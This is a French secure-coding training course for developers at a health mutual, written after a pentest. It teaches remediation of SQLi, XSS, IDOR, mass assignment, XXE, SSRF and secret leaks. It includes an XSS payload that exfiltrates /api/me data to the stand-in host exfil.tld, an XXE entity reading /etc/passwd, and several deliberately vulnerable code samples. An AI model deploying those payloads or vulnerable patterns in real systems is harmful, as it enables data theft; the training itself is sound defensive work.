DE LA THÉORIE À LA PRATIQUE

Sécuriser le code d'une Mutuelle post-pentest, sans ralentir la livraison.

Objectif

Réduire les failles évitables via règles, patterns et automatisation.

Public

Développeurs, Tech Leads, Architectes.

Format

Modules courts, exemples concrets, checklists “prêtes à PR”.

INTRO

Le “Pourquoi”

Retour pentest

Le dernier audit a révélé des classes de failles évitables. L’objectif ici n’est pas de “blâmer”, mais de rendre ces classes impossibles à réintroduire.

  • Injections (SQLi), XSS, SSRF
  • Contrôle d’accès (IDOR / BOLA)
  • Fuites d’information (logs, erreurs, secrets, dépendances)
  • Hygiène CI/CD incomplète (SAST/SCA/secrets)

Enjeu Mutuelle

Données de santé, données personnelles, parfois bancaires. Une faille n’est pas seulement “un bug”: impact adhérents, perte de confiance, exposition réglementaire.

Confiance
Une fuite détruit la relation avec l’adhérent.
Réglementaire
Traçabilité, minimisation, confidentialité.
Opérationnel
Incident = gel des releases + crise.

# Objectifs

> 1. Lire une faille comme une chaîne Source -> Contrôles -> Sink.

> 2. Mettre des garde-fous reproductibles (patterns + outils).

> 3. Industrialiser léger: CI/CD bloque les régressions.

# Approche

> Security by Design: la sécurité comme invariant du code.

> Sécurisé ne doit pas être plus lent: standards + automatisation.

Livrable attendu après formation: checklist PR + pipeline minimal (secrets, SAST, SCA).

MODULE 0

Anatomie d'une faille

Cycle Source → Contrôles → Sink

1) SOURCE

Body JSON, query params, cookies, headers, webhooks, fichiers, DB, API externes.

Règle: toute donnée externe = non fiable.

2) CONTRÔLES

Validation/typage, encodage, authN/authZ, allowlists, timeouts, quotas, logs propres.

La faille apparaît quand un contrôle manque ou est contournable.

3) SINK

SQL execute, template non échappé, innerHTML, requêtes sortantes, désérialisation, interpréteur.

La donnée devient du code, ou pilote une action dangereuse.

Lecture “attaquant”

  • Identifier une source: “où puis-je injecter?”
  • Identifier un sink: “où cela est exécuté/interprété?”
  • Identifier le contrôle manquant: “qu’est-ce qui devrait bloquer?”
  • Évaluer l’impact: données, intégrité, latéralisation, exposition.

Coût de correction (ordre de grandeur)

Corriger tôt = rapide. Corriger tard = coordination + incident + retours arrière.

Signal code smell

1) concat SQL / HTML / URL

2) req.body utilisé “tel quel”

3) autorisation absente (auth uniquement)

4) logs trop bavards / stacktrace en prod

Réponse pattern

A) requêtes paramétrées

B) DTO + validation serveur

C) policy d’accès objet

D) erreurs centralisées + redaction

MODULE 1

SQL Injection (SQLi)

Quand la donnée devient du SQL clique: détail remédiation

Symptôme principal

Construction dynamique de requête par concaténation ou interpolation directe d’un input.

Exemple vulnérable
SELECT * FROM users WHERE name = '" + userInput + "';
Conséquences
  • Dump base adhérents
  • Bypass auth / extraction PII
  • Altération / suppression
  • Pivot applicatif (selon DB/permissions)
Variantes
  • Union-based
  • Blind (time/error)
  • Second-order
  • Injection via ORM mal utilisé
Signal pratique: si tu vois "SELECT ... " + param, tu es déjà dans le rouge.

Règles simples (à mettre dans une checklist PR)

Interdit
  • Concat SQL, même “pour gagner du temps”
  • Nettoyage “maison” (regex / replace) pour “sanitizer”
  • Construction de clauses dynamiques non allowlistées (ORDER BY, LIMIT, colonnes)
Obligatoire
  • Requêtes paramétrées (prepared statements / bind)
  • Validation de type/format en amont (DTO)
  • Principe de moindre privilège sur l’utilisateur DB
  • Logs propres: pas de dump de requêtes complètes avec valeurs sensibles
Piège fréquent ORM

// Certains ORMs “paramètrent” les valeurs, mais pas les identifiants.

ORDER BY ${userSort} // identifiant = allowlist obligatoire

// Solution: mapping “safe” des colonnes autorisées.

MODULE 1

Remédiation SQLi

Principe

Le moteur SQL doit recevoir la requête “compilée” avec des paramètres séparés. La valeur utilisateur est une donnée, jamais un fragment de requête.

MAUVAIS
String q = "SELECT * FROM users WHERE name = '" + userInput + "'";
stmt.execute(q);
BON (Java)
String q = "SELECT * FROM users WHERE name = ?";
PreparedStatement ps = conn.prepareStatement(q);
ps.setString(1, userInput);
ps.executeQuery();
BON (Node / pg)
const q = "SELECT * FROM users WHERE name = $1";
const rows = await db.query(q, [userInput]);

Points d’attention

1) Identifiants dynamiques

On ne “bind” pas un nom de colonne / table. Pour ORDER BY, limiter via allowlist:

const sortMap = { date: "created_at", nom: "last_name" };
const sort = sortMap[req.query.sort] || "created_at";
const q = `SELECT * FROM users ORDER BY ${sort} DESC`;

Le paramètre utilisateur ne doit jamais être injecté directement.

2) Moindre privilège DB
  • Compte applicatif sans droits d’administration
  • Séparer lecture/écriture si possible
  • Auditer les requêtes anormales (sans logguer les valeurs sensibles)
3) Tests de non-régression

Ajouter un test qui injecte une payload classique et vérifie que la requête échoue proprement (ou retourne 0 résultat) sans erreur SQL.

Standard attendu: “0 concat SQL” dans le code review.
MODULE 1

XSS (Cross-Site Scripting)

Exécution de script côté navigateur clique: détail remédiation

Ce que l’attaquant gagne

  • Vol de session (selon cookie/stockage)
  • Actions au nom de l’utilisateur (transactions, changement email, etc.)
  • Phishing interne, redirections, keylogging
  • Dégradation confiance, exposition data
<img src=x onerror="fetch('/api/me').then(r=>r.text()).then(t=>fetch('https://exfil.tld?d='+encodeURIComponent(t)))">
Reflected

Payload renvoyée dans la réponse.

Stored

Payload stockée (DB) et rejouée.

DOM

Manipulation JS côté client.

Signal pratique: innerHTML, dangerouslySetInnerHTML, templates non échappées, markdown rendu sans sanitize.

Où ça arrive (très souvent)

Vulnérable client

output.innerHTML = userComment;

// ou insertion dans un attribut:

el.setAttribute("href", userUrl);

Règle

La sortie doit être encodée selon le contexte (HTML, attribut, URL, JS). Les frameworks modernes protègent souvent “par défaut”, mais pas quand on force du HTML brut.

Défense en profondeur
  • CSP strict (réduit l’impact si une XSS passe)
  • Cookies HttpOnly/SameSite (limite certains scénarios)
  • Réduction des surfaces: pas de rendu HTML non nécessaire
MODULE 1

Remédiation XSS

Encodage contextuel

Même logique que SQLi: séparer “donnée” et “code”. Ici, on empêche l’interpréteur HTML/JS du navigateur de traiter l’input comme du script.

Contextes

HTML : < > " ' deviennent entités

Attribut : encodage + contrôle schémas (http/https)

URL : encodeURIComponent + allowlist

JS : éviter injection dans string exécutée

Frameworks
  • React/Vue/Angular: échappent par défaut
  • Danger: dangerouslySetInnerHTML, v-html, templates “raw”
  • Si HTML nécessaire: sanitizer éprouvé + allowlist (tags/attributs)
Interdit: “sanitize” maison. Utiliser des bibliothèques et une politique d’allowlist.

CSP (Content Security Policy)

La CSP réduit l’exploitabilité en bloquant l’exécution de scripts non autorisés (inline, domaines non approuvés).

Exemple (point de départ)
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none';
Headers associés
  • Strict-Transport-Security (HSTS)
  • X-Content-Type-Options: nosniff
  • Referrer-Policy
  • Permissions-Policy
Standard attendu: pas de rendu HTML brut sans justification + CSP minimale en prod.
MODULE 2

IDOR / BOLA

Scénario

Je suis utilisateur A (ID 100). Je remplace /contrats/100 par /contrats/101. Si j’accède au contrat d’un autre adhérent, c’est une IDOR/BOLA.

VULNÉRABLE (auth sans authZ)
@GetMapping("/contrat/{id}")
public Contrat get(@PathVariable Long id, User user) {
  // Auth OK, mais aucune vérification d'appartenance
  return repo.findById(id); <-- DANGER
}
SECURE (vérif objet)
public Contrat get(Long id, User user) {
  Contrat c = repo.findById(id);
  if (!c.getOwnerId().equals(user.getId())) {
    throw new AccessDeniedException();
  }
  return c;
}

Prévenir les IDOR (pratique)

Règle 1: AuthZ par objet

Chaque accès à une ressource “adhérent” doit vérifier une policy: “est-ce que cet utilisateur a le droit sur cet objet?”

Règle 2: Filtrer au niveau requête

Idéalement, la requête inclut l’identifiant utilisateur (évite l’oubli du check après coup).

SELECT * FROM contrats WHERE id = $1 AND owner_id = $2;
Règle 3: Tests
  • Test: user A tente d’accéder à objet de B → 403
  • Test: endpoints “liste” ne doivent pas inclure d’objets hors périmètre
  • Test: pas de fuite d’existence (éviter 404/403 incohérents si nécessaire)
Standard attendu: aucune ressource métier accessible sans policy explicite.
MODULE 2

Mass Assignment

Le piège

L’attaquant envoie des champs non présents dans l’UI: role, isAdmin, status, creditLimit. Si le backend “bind” tout le JSON à l’entité, il applique ces champs.

VULNÉRABLE (Node/Express style)
app.post('/profile', async (req, res) => {
  // Bind complet du body
  await User.update({ id: req.user.id }, req.body);
  res.sendStatus(204);
});
Impact
  • Escalade de privilèges (role/admin)
  • Altération de statut (validation, paiement, remboursement)
  • Contournement workflow métier

Solution: DTO strict + allowlist

SECURE (allowlist)
const dto = {
  email: req.body.email,
  nom: req.body.nom,
  telephone: req.body.telephone,
};
await User.update({ id: req.user.id }, dto);
Validation serveur
  • Schéma (types, longueur, format, enum)
  • Rejet explicite des champs inattendus (optionnel mais utile)
  • Logs: tracer “champ inattendu reçu” sans logguer la donnée sensible
Astuce architecture

Ne jamais exposer directement des entités DB via API. Mapper DB → DTO sortie, et DTO entrée → DB.

Standard attendu: endpoints d’update = DTO dédiés, jamais “req.body” direct.
MODULE 3

XXE & SSRF

XXE

XML External Entity: quand un parser XML autorise des entités externes, l’attaquant peut forcer des lectures de fichiers ou des accès réseau (selon config).

Risque
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>
Remédiation
  • Désactiver DTD / entités externes
  • Utiliser des parsers “secure by default”
  • Limiter taille/profondeur (DoS XML)

SSRF

Server-Side Request Forgery: quand le serveur fait une requête sortante basée sur une entrée utilisateur (URL), l’attaquant peut viser des services internes (métadonnées cloud, admin panels, APIs privées).

Vulnérable
const url = req.body.url;
const resp = await fetch(url);
return res.send(await resp.text());
Remédiation (pratique)
  • Allowlist stricte (domaines, chemins)
  • Bloquer IP privées / loopback / link-local
  • Désactiver redirects, timeouts courts
  • Proxy sortant contrôlé + observabilité
Standard attendu: pas de fetch(URL) user-controlled sans allowlist + contrôles réseau.
MODULE 4

Secrets & Logs

Gestion des secrets

INTERDIT
const API_KEY = "sk_live_12345";
// commit Git = fuite durable
ATTENDU
const API_KEY = process.env.API_KEY;
// et stockage via vault / secret manager selon contexte
Standard
  • Rotation périodique (et après incident)
  • Scans secrets en CI (et idéalement pre-commit)
  • Scopes minimaux (API keys limitées)
  • Traçabilité: qui a accédé, quand

Logs & données sensibles

Risque

Les logs finissent dans des systèmes centralisés. S’ils contiennent PII, santé, tokens, ils deviennent une base secondaire de fuite.

BAD
log.info("User created: " + user.toString());
log.debug("Headers: " + request.getHeaders());
// tokens / données santé peuvent se retrouver ici
GOOD
log.info("User created", { id: user.id, correlationId });
log.warn("Validation error", { field: "email", correlationId });
// redaction + logs structurés
Standard attendu: logs structurés + redaction + pas de secrets/PII en clair.
MODULE 4

Dépendances (SCA)

Pourquoi c’est critique

Une grosse partie du risque vient des bibliothèques. Une dépendance vulnérable = vulnérabilité importée.

Standard attendu
  • Lockfile présent et respecté
  • Politique de mise à jour (mensuelle / trimestrielle)
  • Scan SCA en CI et en PR
  • Bloquer sur vulnérabilités critiques exploitables
Pièges
  • Paquets abandonnés
  • Transitives vulnérables (pas visibles)
  • Versions flottantes

MODULE 5

Hall of Shame

Interdit

Ce sont des patterns qui re-génèrent des findings en continu.

  • Trust Client : validations JS uniquement (attaquant = cURL/Burp).
  • Catch-all silencieux : try/catch vide, ou “TODO” permanent.
  • Commentaires dette : “temporaire” resté 3 ans.
  • Hardcoding : secrets, URLs prod, flags de debug.
  • Logs bavards : stacktraces, tokens, PII en clair.
Exemples mauvaises pratiques
Trust Client

// Front if (email.includes("@")) ok = true;

// Back aucune validation

Catch silencieux

try { doRisky(); } catch (e) { // TODO }

Hardcoding

const BASE_URL = "https://prod.api.local";

Objectif: ces patterns doivent être détectés par linter/SAST et bloqués en PR.
MODULE 5

Niveau 1 : L’Obligatoire

Non négociable pour passer en production

BLOCKING
Entrées validées

Typage + contraintes (longueur, format, enum). Validation serveur systématique.

0 concat SQL

Requêtes paramétrées uniquement. Identifiants dynamiques via allowlist.

Zéro secret

Secrets hors Git, rotation, scan secrets en CI.

HTTPS partout

Pas de contenu mixte, HSTS selon politique.

Auth vérifiée

Pas d’endpoint “oublié”. AuthN + AuthZ cohérentes.

Erreurs propres

Pas de stacktrace en prod. Gestion centralisée.

Critère PR

Si un point du Niveau 1 manque, la Pull Request est rejetée. Le but est de rendre l’exception impossible.

Linter & SAST

Le correcteur orthographique sécurité

On ne compte pas sur la mémoire. On automatise la détection des patterns vus dans les modules.

SonarLint / SonarQube Qualité + sécurité baseline. Idéal dans l’IDE + gate CI.
Semgrep Rapide, rules custom (ex: “interdire req.body direct”, “interdire innerHTML”).
Exemples de règles utiles
  • Détecter concat SQL / template non échappé
  • Détecter “req.body” passé direct à update()
  • Détecter fetch(url) user-controlled
  • Détecter hardcoded secrets

# Politique simple

> Linter: ne doit pas passer avec warnings ignorés.

> SAST: échoue si vulnérabilité critique (Niveau 1).

> SCA: échoue si dépendance critique exploitable.

> Secrets: échoue si secret détecté.

# Principe

> Le pipeline n’est pas un rapport: c’est un garde-fou.

> On préfère “bloquer tôt” plutôt que “corriger en crise”.

Résultat attendu: réduction massive des findings récurrents d’un pentest à l’autre.

MODULE 6

Pipeline CI/CD Sécurisée

Objectif

Bloquer automatiquement les régressions Niveau 1 (et idéalement une partie du Niveau 2).

Gates recommandés
  • Tests unitaires
  • Scan secrets
  • SAST rapide
  • SCA (dépendances)
  • Build et packaging
Pratique

Règle simple: si la CI ne bloque pas un pattern “Hall of Shame”, elle ne sert pas encore.

PIPELINE MINIMAL (RÉALISTE)
Commit / PR
Tests unitaires
Scan secrets BLOCK
SAST (Semgrep/Sonar)
SCA (dépendances)
Build

Le pipeline doit être rapide, explicable, et appliqué à chaque PR.

Checklist Développeur

Avant de merger

  • Entrées validées et typées côté serveur
  • 0 concat SQL (requêtes paramétrées)
  • Sorties encodées selon le contexte (anti-XSS)
  • AuthZ par objet vérifiée (anti-IDOR)
  • DTO strict (anti-mass assignment)
  • Pas de secrets dans le code / logs propres
  • Dépendances scannées / lockfile stable
  • CI verte avec scans (secrets/SAST/SCA)
CONCLUSION

Prochaines étapes

Pour demain matin (plan concret)

  1. Lancer un scan baseline (secrets + SAST + SCA) sur le projet actuel.
  2. Créer une checklist PR Niveau 1 (blocking) et l’appliquer sur les endpoints sensibles.
  3. Choisir 3 règles Semgrep “must-have” (req.body direct, innerHTML, fetch(url)).
  4. Mettre en place un gate CI: échec si secret détecté ou vulnérabilité critique.
  5. Planifier une session de remédiation: top findings, quick wins, tests de non-régression.
Résultat attendu: baisse rapide des findings récurrents dès le prochain audit.

Q&A

Questions fréquentes

“On a un ORM, donc pas de SQLi ?”

Non. Les valeurs sont souvent paramétrées, mais pas les identifiants dynamiques, ni les “raw queries”, ni certains helpers mal utilisés.

“React protège de XSS, donc CSP inutile ?”

React réduit le risque, mais CSP limite l’impact si une injection passe via un rendu HTML, une lib, un markdown, ou un DOM XSS.

“Pourquoi bloquer en CI ?”

Parce que la sécurité n’est pas un audit ponctuel: c’est un invariant contrôlé à chaque PR.

“On commence par quoi ?”

Niveau 1: validation serveur, requêtes paramétrées, authZ objet, secrets, logs propres, scans CI.

Fin: aligner l’équipe sur des règles simples, puis automatiser pour éviter les régressions.
